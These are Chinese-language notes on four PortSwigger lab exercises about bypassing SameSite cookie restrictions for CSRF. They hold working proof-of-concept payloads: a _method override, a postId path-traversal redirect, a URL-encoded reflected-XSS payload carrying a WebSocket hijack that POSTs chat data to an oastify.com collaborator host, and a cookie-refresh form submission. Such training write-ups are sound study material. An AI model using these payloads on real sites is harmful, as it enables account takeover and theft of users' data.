## 使用 GET 请求绕过 SameSite Lax 限制

实验：通过方法覆盖绕过 SameSite Lax
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override

登录的响应为
Set-Cookie: session=VMYM6cS0aEYA5Dz2grt78P3zCNErqJLM; Expires=Sun, 19 Oct 2025 10:36:15 UTC; Secure; HttpOnly
使用默认samesite，chrome为lex宽松模式，可使用get型跳转

更改邮件功能仅使用cookie的会话令牌
POST /my-account/change-email HTTP/2

email=a%40a

转为get
GET /my-account/change-email?email=aa%40a HTTP/2

概念验证为
```html
<!-- 
脚本跳转显示 
HTTP/2 405 Method Not Allowed
Allow: POST
-->
<script>
    document.location = 'https://0a450006042095f28006b7ae00bb0011.web-security-academy.net/my-account/change-email?email=aa%40a';
</script>
```

示例解决方案为：在参数中添加 _method=POST 
Ruby on Rails 和 Express.js 都支持通过 _method 参数覆盖 HTTP 方法
GET /my-account/change-email?email=foo%40com&_method=POST HTTP/1.1

在之前的验证概念后添加框架方法覆盖的参数
```html
<script>
    document.location = 'https://0a450006042095f28006b7ae00bb0011.web-security-academy.net/my-account/change-email?email=aa%40a&_method=POST';
</script>
```

## 使用本站工具绕过 SameSite 限制

实验：通过客户端重定向绕过 SameSite Strict
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

登录的响应为
Set-Cookie: session=9kZQjyxVHNxJjaPkaZTiolS9Qz7qbAL8; Secure; HttpOnly; SameSite=Strict
cookie的属性 SameSite=Strict 禁止全部跨站

使用评论功能，提交后服务器返回
HTTP/2 302 Found
Location: /post/comment/confirmation?postId=4

对此的请求的响应为
```html
<script src='/resources/js/commentConfirmationRedirect.js'></script>
<script>redirectOnConfirmation('/post');</script>
```

浏览包含的js文件
```javascript
// 注入点为postId参数值
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
        // 当前路径为 /post/postId
    }, 3000);
}
```

更改邮箱功能仅使用会话cookie，且服务器接收get方法

构建get更改email的url：
从 /post/postId 中使用 .. 返回根目录

于是postId的值设置为：
../my-account/change-email?email=ccc%40aa&submit=1

在重定向url中添加此设置：
/post/comment/confirmation?postId=../my-account/change-email?email=ccc%40aa%26submit=1

验证概念
```html
<!-- 整个更改email的字符串作为 postId的参数，于是在url中表示参数分隔的 & 应当进行url编码为 %26 -->
<script>
    document.location = 'https://0a5e00e604524368801817cb00600049.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=ccc%40aa%26submit=1';
</script>
```

## 通过易受攻击的兄弟域名绕过 SameSite 限制

实验：通过同级域绕过 SameSite Strict
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

相关lab
WebSocket - 实验：跨站 WebSocket 劫持

此处拥有sanmesite的限制，于是跨站无法提交cookie


```html
<script>
const socket = new WebSocket('wss://0a3a00f903fe12b780c417c5002e0024.web-security-academy.net/chat');
socket.onopen = (event) => {
console.log('build');
socket.send('READY');
};
socket.onmessage = (event) => {
console.log('rec:', event.data);
fetch('https://pngqn8h00sbgbkwq8c3iv0k78yep2fq4.oastify.com', {
method: 'POST',
mode: 'no-cors',
body: event.data
});
};
socket.onclose = (event) => {
console.log('close');
};
</script>
```

示例解决方案：
对资源请求的响应为
Access-Control-Allow-Origin: https://cms-0a3a00f903fe12b780c417c5002e0024.web-security-academy.net
揭示了兄弟域

访问此兄弟域 
响应中的表单拥有反射XSS漏洞
在burp中切换方法为get，仍可实现

添加上面的WebSocket脚本，使用url编码
设置页面跳转到此同站但不同源的已被攻破的页面
```html
<script>
    document.location = 'https://cms-0a3a00f903fe12b780c417c5002e0024.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0d%0a%63%6f%6e%73%74%20%73%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%33%61%30%30%66%39%30%33%66%65%31%32%62%37%38%30%63%34%31%37%63%35%30%30%32%65%30%30%32%34%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0d%0a%73%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%28%65%76%65%6e%74%29%20%3d%3e%20%7b%0d%0a%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%27%62%75%69%6c%64%27%29%3b%0d%0a%73%6f%63%6b%65%74%2e%73%65%6e%64%28%27%52%45%41%44%59%27%29%3b%0d%0a%7d%3b%0d%0a%73%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%28%65%76%65%6e%74%29%20%3d%3e%20%7b%0d%0a%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%27%72%65%63%3a%27%2c%20%65%76%65%6e%74%2e%64%61%74%61%29%3b%0d%0a%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%70%6e%67%71%6e%38%68%30%30%73%62%67%62%6b%77%71%38%63%33%69%76%30%6b%37%38%79%65%70%32%66%71%34%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%0d%0a%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%0d%0a%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%0d%0a%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%0d%0a%7d%29%3b%0d%0a%7d%3b%0d%0a%73%6f%63%6b%65%74%2e%6f%6e%63%6c%6f%73%65%20%3d%20%28%65%76%65%6e%74%29%20%3d%3e%20%7b%0d%0a%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%27%63%6c%6f%73%65%27%29%3b%0d%0a%7d%3b%0d%0a%3c%2f%73%63%72%69%70%74%3e&password=a';
</script>
```


## 使用新发行的 cookie 绕过 SameSite Lax 限制

实验：通过 cookie 刷新绕过 SameSite Lax
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh

服务器响应中未显式设置 samesite=lax 时，客户端在120秒内不执行默认的 samesite lax 的禁用post策略
尝试进行cookie刷新

修改邮件功能仅使用会话 cookie，仅接受 post 方法
POST /my-account/change-email HTTP/2

尝试进行cookie刷新后提交更改email的post表单

观察登录过程，对/social-login的请求将刷新cookie
GET /social-login HTTP/2


```html

<form action="https://0a4100a20409053f80ec67d000b0009f.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="k@eee" />
</form>
<script>
    window.onclick = () => {
        window.open('https://0a4100a20409053f80ec67d000b0009f.web-security-academy.net/social-login');

        // setTimeout(changeEmail, 5000);
        setTimeout(() => {
            document.forms[0].submit();
            }, 5000);
    }
    // function changeEmail() {
    //     document.forms[0].submit();
    // }
</script>
```